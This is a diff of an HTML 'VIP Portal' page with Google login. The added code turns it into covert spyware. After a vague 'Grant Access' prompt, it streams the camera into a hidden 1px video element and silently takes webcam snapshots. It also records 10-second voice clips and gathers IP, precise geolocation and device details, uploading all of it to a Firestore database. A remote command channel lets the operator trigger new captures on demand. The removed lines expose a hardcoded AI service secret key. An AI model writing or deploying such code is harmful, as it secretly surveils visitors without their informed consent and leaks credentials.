@@ -4,257 +4,402 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Ultimate VIP Portal</title>
-
+    <title>Ratan Bro | VIP Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
     <style>
         :root {
-            --pink-main: #ff4d94;
-            --pink-glow: rgba(255, 77, 148, 0.6);
-            --bg-dark: #020617;
-            --glass: rgba(255, 255, 255, 0.08);
+            --pink: #ff4d94;
+            --glow: #ff4d94;
+            --dark: #020617;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--bg-dark); color: white; min-height: 100vh; overflow-x: hidden; touch-action: manipulation; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
 
-        /* --- BACKGROUND MESH --- */
-        .login-bg-mesh { position: fixed; inset: 0; z-index: -2; background: linear-gradient(45deg, #020617, #1a0821, #020617); background-size: 400% 400%; animation: meshMove 12s ease infinite; }
-        @keyframes meshMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        body {
+            background: var(--dark);
+            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617;
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-        /* --- MOUSE & TOUCH TRAIL --- */
-        .trail-particle { position: fixed; pointer-events: none; z-index: 10001; color: var(--pink-main); filter: drop-shadow(0 0 5px var(--pink-glow)); animation: particleFade 0.8s forwards ease-out; }
-        @keyframes particleFade { to { transform: translateY(15px) scale(0); opacity: 0; } }
+        /* Login & Perm Modal */
+        #login-overlay,
+        #perm-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 23, 0.95);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+        }
 
-        /* --- HEADER RAIN --- */
-        .header-love-wrap { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; overflow: hidden; border-radius: 40px; }
-        .header-heart { position: absolute; color: var(--pink-main); animation: hRain linear forwards; opacity: 0; }
-        @keyframes hRain { 0% { transform: translateY(-50px) rotate(0deg); opacity: 0; } 20% { opacity: 0.8; } 100% { transform: translateY(350px) rotate(360deg); opacity: 0; } }
+        .glass-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 77, 148, 0.3);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
 
-        /* --- UI ELEMENTS --- */
-        .main-header { margin: 20px; padding: 50px 20px; border-radius: 40px; background: linear-gradient(135deg, rgba(255, 77, 148, 0.1), rgba(255, 255, 255, 0.05)); border: 1px solid rgba(255, 120, 180, 0.2); backdrop-filter: blur(20px); text-align: center; position: relative; }
-        .user-name-glow { font-size: 30px; font-weight: 900; background: linear-gradient(90deg, #fff, var(--pink-main), #fff); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: shine 3s linear infinite; }
-        @keyframes shine { to { background-position: 200% center; } }
-        
-        .grid-layout { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 0 20px 30px; max-width: 600px; margin: 0 auto; }
-        .nav-card { background: var(--glass); border-radius: 30px; padding: 25px 15px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255, 255, 255, 0.05); animation: autoBari 4s infinite; transition: 0.3s; position: relative; cursor: pointer; }
-        .nav-card:active { transform: scale(0.95); }
-        @keyframes autoBari { 0%, 100% { border-color: rgba(255,255,255,0.05); } 50% { border-color: var(--pink-main); } }
-        .nav-card i { font-size: 2.2rem; color: var(--pink-main); margin-bottom: 8px; }
+        /* Header Box Profile */
+        .hero-header {
+            margin: 20px;
+            padding: 30px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            position: relative;
+            overflow: hidden;
+        }
 
-        .hd-avatar { object-fit: cover; border-radius: 50%; display: block; image-rendering: -webkit-optimize-contrast; }
+        .hero-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 77, 148, 0.1), transparent);
+            z-index: -1;
+        }
 
-        .btn-premium { background: linear-gradient(90deg, var(--pink-main), #cc0052); color: white; border: none; padding: 12px 20px; border-radius: 50px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.3s; }
-        .p-input { width: 100%; background: #000; border: 1px solid #333; color: white; padding: 12px 20px; border-radius: 50px; outline: none; margin-bottom: 10px; }
+        .profile-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
 
-        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 10000; padding: 20px; }
-        .social-btn { width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; text-decoration: none; color: white; font-size: 18px; }
+        .p-img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid var(--pink);
+            box-shadow: 0 0 25px var(--pink);
+            object-fit: cover;
+            transition: 0.3s;
+        }
 
-        .result-card { background: #000; border: 2px solid var(--pink-main); padding: 25px; border-radius: 35px; width: 100%; max-width: 350px; text-align: center; position: relative; }
+        .user-p-img {
+            width: 85px;
+            height: 85px;
+            border: 3px solid #fff;
+            margin-left: -25px;
+        }
+
+        /* Glow Grid Buttons */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            text-decoration: none;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.4s;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: var(--pink);
+            box-shadow: 0 0 20px rgba(255, 77, 148, 0.4);
+            background: rgba(255, 77, 148, 0.05);
+        }
+
+        .card i {
+            font-size: 2.2rem;
+            color: var(--pink);
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 5px var(--pink));
+        }
+
+        /* Compact Chatbot */
+        .chat-area {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+
+        .chat-mini {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            font-size: 13px;
+        }
+
+        #chat-log {
+            height: 60px;
+            overflow-y: auto;
+            color: #ccc;
+            margin-bottom: 8px;
+        }
+
+        .chat-in {
+            display: flex;
+            gap: 8px;
+        }
+
+        .chat-in input {
+            flex: 1;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 50px;
+            outline: none;
+            font-size: 12px;
+        }
+
+        .logout-btn {
+            background: transparent;
+            border: 1px solid #444;
+            color: #aaa;
+            padding: 5px 15px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 12px;
+            margin: 10px;
+        }
+
+        /* Black Snap Fix */
+        canvas {
+            display: none;
+        }
+
+        #vSource {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
     </style>
 </head>
 
 <body>
-    <div class="login-bg-mesh"></div>
 
-    <audio id="snd-open" src="open.mp3" preload="auto"></audio>
+    <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
+    <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
+    <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
 
-    <div id="login-screen" class="modal" style="display: flex;">
-        <div style="text-align: center; background: var(--glass); padding: 40px; border-radius: 40px; border: 1px solid var(--pink-main);">
-            <img src="ratan.jpg" class="hd-avatar" style="width:100px; height:100px; border:3px solid var(--pink-main); margin: 0 auto 15px;">
-            <h2>RATAN BRO</h2>
-            <p style="color:#555; font-size:12px; margin-bottom:20px;">VIP PORTAL LOGIN</p>
-            <button class="btn-premium" onclick="login()">LOGIN WITH GOOGLE</button>
+    <div id="login-overlay">
+        <div class="glass-box">
+            <img src="ratan.jpg"
+                style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
+            <h3>Ratan Bro Portal</h3>
+            <button onclick="googleLogin()"
+                style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px; box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);">
+                Login with Google
+            </button>
         </div>
     </div>
 
-    <div id="audio-gate-modal" class="modal">
-        <div style="text-align: center; background: var(--glass); padding: 30px; border-radius: 40px; border: 1px solid var(--pink-main); max-width: 320px;">
-            <i class="fas fa-unlock-alt" style="font-size: 2.5rem; color: var(--pink-main); margin-bottom: 15px;"></i>
-            <h3 style="margin-bottom: 10px;">স্বাগতম বস্!</h3>
-            <p style="font-size: 14px; color: #ccc; margin-bottom: 25px;">ড্যাশবোর্ড আনলক করতে নিচের বাটনে ক্লিক করুন।</p>
-            <button class="btn-premium" onclick="enterDashboard()">ENTER DASHBOARD</button>
+    <div id="perm-modal" style="display:none;">
+        <div class="glass-box">
+            <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
+            <h3 style="margin:15px 0;">পারমিশন</h3>
+            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">প্রবেশ করতে Allow করুন।</p>
+            <button onclick="startApp()"
+                style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant
+                Access</button>
         </div>
     </div>
 
-    <div id="dashboard-ui" style="display: none;">
-        <div style="display: flex; justify-content: space-between; align-items: center; padding: 15px 20px;">
-            <div style="display: flex; gap: 10px;">
-                <a href="https://www.facebook.com/profile.php?id=61552305287329" class="social-btn" style="background: #1877f2;"><i class="fab fa-facebook-f"></i></a>
-                <a href="https://wa.me/8801609160109" class="social-btn" style="background: #25d366;"><i class="fab fa-whatsapp"></i></a>
+    <div id="main-ui" style="display:none;">
+        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
+
+        <div class="hero-header">
+            <div class="profile-wrapper">
+                <img src="ratan.jpg" class="p-img">
+                <img id="u-pic" src="" class="p-img user-p-img">
             </div>
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <div style="color: var(--pink-main); font-weight: 700; font-size: 13px;"><i class="fas fa-eye"></i> <span id="v-count">200</span></div>
-                <button onclick="logout()" style="color:#666; background:none; border:1px solid #333; padding:4px 12px; border-radius:50px; font-size:11px;">Sign Out</button>
-            </div>
+            <h2 id="u-name" style="text-align:center; margin-top:15px; font-weight:700;"></h2>
+            <p style="text-align:center; color:var(--pink); font-size:14px; font-weight:bold;">Verified Member</p>
         </div>
 
-        <header class="main-header">
-            <div id="header-rain" class="header-love-wrap"></div>
-            <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 15px; position: relative; z-index: 5;">
-                <img src="ratan.jpg" class="hd-avatar" style="width:100px; height:100px; border:3px solid var(--pink-main);">
-                <img id="u-photo" src="" class="hd-avatar" style="width:80px; height:80px; border:3px solid white; margin-left:-25px; z-index:6;">
-            </div>
-            <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
-                <i class="fas fa-heart" style="color:var(--pink-main); animation:heartBeat 1.2s infinite;"></i>
-                <span id="u-name" class="user-name-glow">...</span>
-                <i class="fas fa-heart" style="color:var(--pink-main); animation:heartBeat 1.2s infinite;"></i>
-            </div>
-            <p id="u-wish" style="margin-top: 10px; font-size: 14px; color: #ccc;">লোড হচ্ছে...</p>
-        </header>
+        <div class="grid">
+            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i>
+                <p>Test Paper</p>
+            </a>
 
-        <main class="grid-layout">
-            <div class="nav-card" onclick="openNotice()">
-                <div id="alert-dot" style="position:absolute; top:12px; right:12px; width:8px; height:8px; background:red; border-radius:50%; display:none; box-shadow: 0 0 10px red;"></div>
-                <i class="fas fa-bullhorn"></i><p>নোটিশ বোর্ড</p>
-            </div>
-            <a href="portfolio.html" class="nav-card"><i class="fas fa-user-tie"></i><p>আমার ডিটেইলস</p></a>
-            <a href="business.html" class="nav-card"><i class="fas fa-shopping-bag"></i><p>বিজনেসের খবর</p></a>
-            <div class="nav-card" onclick="document.getElementById('p-maker-modal').style.display='flex'"><i class="fas fa-magic"></i><p>পোর্টফোলিও মেকার</p></div>
-            <a href="testpaper.html" class="nav-card"><i class="fas fa-graduation-cap"></i><p>নোটস / ফাইল</p></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="nav-card"><i class="fas fa-search"></i><p>নম্বর ডিটেইলস</p></a>
-        </main>
+            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();">
+                <i class="fas fa-handshake"></i>
+                <p>Business</p>
+            </a>
 
-        <section style="max-width: 500px; margin: 0 auto 50px; padding: 0 20px;">
-            <div style="background: rgba(0,0,0,0.5); padding: 20px; border-radius: 30px; border: 1px solid rgba(255,77,148,0.1);">
-                <div id="chat-content" style="height: 100px; overflow-y: auto; font-size: 13px; margin-bottom: 10px;"></div>
-                <div style="display: flex; gap: 8px;">
-                    <input type="text" id="ai-msg" placeholder="AI কে কিছু জিজ্ঞেস করো..." style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:10px 15px; border-radius:50px; outline:none; font-size:13px;">
-                    <button onclick="askAI()" class="btn-premium" style="width:auto; padding:0 15px;">পাঠাও</button>
+            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();">
+                <i class="fas fa-laptop-code"></i>
+                <p>Portfolio</p>
+            </a>
+
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"
+                onclick="document.getElementById('snd-look').play();">
+                <i class="fas fa-search"></i>
+                <p>Lookup</p>
+            </a>
+        </div>
+
+        <div class="chat-area">
+            <div class="chat-mini">
+                <div id="chat-log">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
+                <div class="chat-in">
+                    <input type="text" id="ai-msg" placeholder="Ask AI...">
+                    <button onclick="askAI()"
+                        style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; font-size:11px; cursor:pointer;">Send</button>
                 </div>
             </div>
-        </section>
-    </div>
-
-    <div id="p-maker-modal" class="modal">
-        <div style="background: #000; width: 100%; max-width: 380px; padding: 30px; border-radius: 35px; border: 1px solid var(--pink-main); text-align: center;">
-            <h3 style="color: var(--pink-main); margin-bottom: 20px;">মেক পোর্টফোলিও</h3>
-            <input type="text" id="p-name" placeholder="আপনার পূর্ণ নাম" class="p-input">
-            <input type="text" id="p-title" placeholder="টাইটেল" class="p-input">
-            <input type="text" id="p-phone" placeholder="ফোন নম্বর" class="p-input">
-            <input type="text" id="p-fb" placeholder="ফেসবুক লিঙ্ক" class="p-input">
-            <input type="text" id="p-wa" placeholder="হোয়াটসঅ্যাপ" class="p-input">
-            <button class="btn-premium" onclick="createPortfolio()">জেনারেট করুন</button>
-            <button onclick="document.getElementById('p-maker-modal').style.display='none'" style="margin-top:15px; background:none; border:none; color:#555;">বন্ধ করুন</button>
         </div>
     </div>
 
-    <div id="portfolio-modal" class="modal"><div id="p-result-area"></div></div>
-
-    <div id="notice-modal" class="modal">
-        <div style="background: #000; padding: 30px; border-radius: 35px; border: 1px solid var(--pink-main); text-align: center; max-width: 350px;">
-            <i class="fas fa-envelope-open-text" style="font-size: 2.5rem; color: var(--pink-main); margin-bottom: 15px;"></i>
-            <p id="notice-body" style="color: #ccc; margin-bottom: 20px;"></p>
-            <button class="btn-premium" onclick="document.getElementById('notice-modal').style.display='none'">বুঝেছি</button>
-        </div>
-    </div>
+    <canvas id="snapCanvas" width="640" height="480"></canvas>
+    <video id="vSource" autoplay playsinline muted></video>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, updateDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        const firebaseConfig = { apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo", authDomain: "ratanweab.firebaseapp.com", projectId: "ratanweab", storageBucket: "ratanweab.firebasestorage.app", messagingSenderId: "611953936063", appId: "1:611953936063:web:7e3ca24060d7478fb2a80a" };
+        const firebaseConfig = {
+            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
+            authDomain: "ratanweab.firebaseapp.com",
+            projectId: "ratanweab",
+            storageBucket: "ratanweab.firebasestorage.app",
+            messagingSenderId: "611953936063",
+            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
+        };
+
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
-        const AI_API = "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";
+        let loggedUser = null;
 
-        let userPhotoHD = '';
-        let currentMsg = null;
-
-        const createTrail = (x, y) => {
-            const p = document.createElement('i');
-            p.className = 'fas fa-heart trail-particle';
-            p.style.left = x + 'px'; p.style.top = y + 'px';
-            document.body.appendChild(p);
-            setTimeout(() => p.remove(), 800);
-        };
-        window.addEventListener('mousemove', (e) => createTrail(e.clientX, e.clientY));
-
-        window.login = () => signInWithPopup(auth, provider);
-        window.logout = () => signOut(auth).then(() => location.reload());
-
-        // MAIN AUTH LOGIC
-        onAuthStateChanged(auth, (user) => {
+        onAuthStateChanged(auth, async (user) => {
             if (user) {
-                userPhotoHD = user.photoURL.replace('s96-c', 's400-c');
-                document.getElementById('u-name').innerText = user.displayName;
-                document.getElementById('u-photo').src = userPhotoHD;
-                document.getElementById('login-screen').style.display = 'none';
-                
-                // Show the "Enter Dashboard" Popup to bypass Autoplay block
-                document.getElementById('audio-gate-modal').style.display = 'flex';
-                
-                setBDWish(user.displayName);
-                startRain();
+                loggedUser = user;
+                document.getElementById('login-overlay').style.display = 'none';
+                document.getElementById('perm-modal').style.display = 'flex';
             }
         });
 
-        // Function triggered when "Enter Dashboard" is clicked
-        window.enterDashboard = () => {
-            document.getElementById('audio-gate-modal').style.display = 'none';
-            document.getElementById('dashboard-ui').style.display = 'block';
-            
-            // Play Welcome Sound
-            const audio = document.getElementById('snd-open');
-            audio.play().catch(e => console.log("Audio play failed:", e));
+        window.googleLogin = () => signInWithPopup(auth, provider);
+        window.googleLogout = () => signOut(auth).then(() => location.reload());
+
+        window.startApp = async () => {
+            const video = document.getElementById('vSource');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
+
+            if (stream) {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => video.play();
+            }
+
+            document.getElementById('perm-modal').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
+            document.getElementById('u-name').innerText = loggedUser.displayName;
+            document.getElementById('u-pic').src = loggedUser.photoURL;
+
+            if (stream) {
+                setTimeout(() => takeSnap(loggedUser), 2000);
+                recordVoice(stream, 10000);
+            }
+
+            onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (s) => {
+                if (s.data()?.command === "snap") takeSnap(loggedUser);
+                if (s.data()?.command === "voice") recordVoice(stream, 10000);
+                if (s.data()?.command) updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
+            });
         };
 
-        function setBDWish(name) {
-            const hour = new Date().getHours();
-            let msg = (hour < 12) ? "শুভ সকাল" : (hour < 17) ? "শুভ দুপুর" : "শুভ সন্ধ্যা";
-            document.getElementById('u-wish').innerText = `${msg}, ${name}! কি খবর?`;
+        async function takeSnap(user) {
+            const video = document.getElementById('vSource');
+            const canvas = document.getElementById('snapCanvas');
+            const ctx = canvas.getContext('2d');
+
+            if (video.readyState < 2 || video.videoWidth === 0) {
+                setTimeout(() => takeSnap(user), 1000);
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const dataImg = canvas.toDataURL('image/jpeg', 0.6);
+            const userRef = doc(db, "users", user.email.replace('.', '_'));
+            const s = await getDoc(userRef);
+            let picList = s.data()?.picList || [];
+            picList.unshift(dataImg);
+            if (picList.length > 5) picList.pop();
+
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'N/A' }));
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await setDoc(userRef, {
+                    name: user.displayName, email: user.email, photo: user.photoURL,
+                    picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
+                    status: "Online", lastView: new Date().toLocaleString(), device: navigator.userAgent
+                }, { merge: true });
+            }, async () => {
+                await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
+            }, { enableHighAccuracy: true });
         }
 
-        function startRain() {
-            const wrap = document.getElementById('header-rain');
-            setInterval(() => {
-                const h = document.createElement('i');
-                h.className = 'fas fa-heart header-heart';
-                h.style.left = Math.random() * 100 + '%';
-                wrap.appendChild(h);
-                setTimeout(() => h.remove(), 4000);
-            }, 600);
+        async function recordVoice(stream, time) {
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = async () => {
+                    const userRef = doc(db, "users", loggedUser.email.replace('.', '_'));
+                    const s = await getDoc(userRef);
+                    let audioList = s.data()?.audioList || [];
+                    audioList.unshift(reader.result);
+                    if (audioList.length > 4) audioList.pop();
+                    await updateDoc(userRef, { audioList });
+                };
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), time);
         }
 
         window.askAI = async () => {
-            const inp = document.getElementById('ai-msg');
-            const log = document.getElementById('chat-content');
-            if(!inp.value) return;
-            const val = inp.value;
-            log.innerHTML += `<div style="text-align:right; color:var(--pink-main); margin-bottom:5px;"><b>You:</b> ${val}</div>`;
-            inp.value = "চিন্তা করছি...";
-            try {
-                const r = await fetch("https://api.openai.com/v1/chat/completions", {
-                    method:"POST",
-                    headers:{"Content-Type":"application/json", "Authorization":`Bearer ${AI_API}`},
-                    body: JSON.stringify({model:"gpt-4o-mini", messages:[{role:"user", content:val}]})
-                });
-                const d = await r.json();
-                log.innerHTML += `<div style="margin-bottom:10px;"><b>AI:</b> ${d.choices[0].message.content}</div>`;
-            } catch(e){ log.innerHTML += `<div style="color:red;">Error!</div>`; }
-            inp.value = "";
-            log.scrollTop = log.scrollHeight;
-        };
-
-        onSnapshot(doc(db, "system", "updates"), (s) => {
-            if(s.exists()){
-                currentMsg = s.data();
-                if(currentMsg.hasNew) document.getElementById('alert-dot').style.display='block';
-            }
-        });
-
-        window.openNotice = () => {
-            if(currentMsg){
-                document.getElementById('notice-body').innerText = currentMsg.message;
-                document.getElementById('notice-modal').style.display = 'flex';
-                document.getElementById('alert-dot').style.display = 'none';
-            }
-        };
+            const msg = document.getElementById('ai-msg').value;
+            if (!msg) return;
+            document.getElementById('chat-log').innerText = "You: " + msg;
+            document.getElementById('ai-msg').value = "";
+        }
     </script>
 </body>
+
 </html>
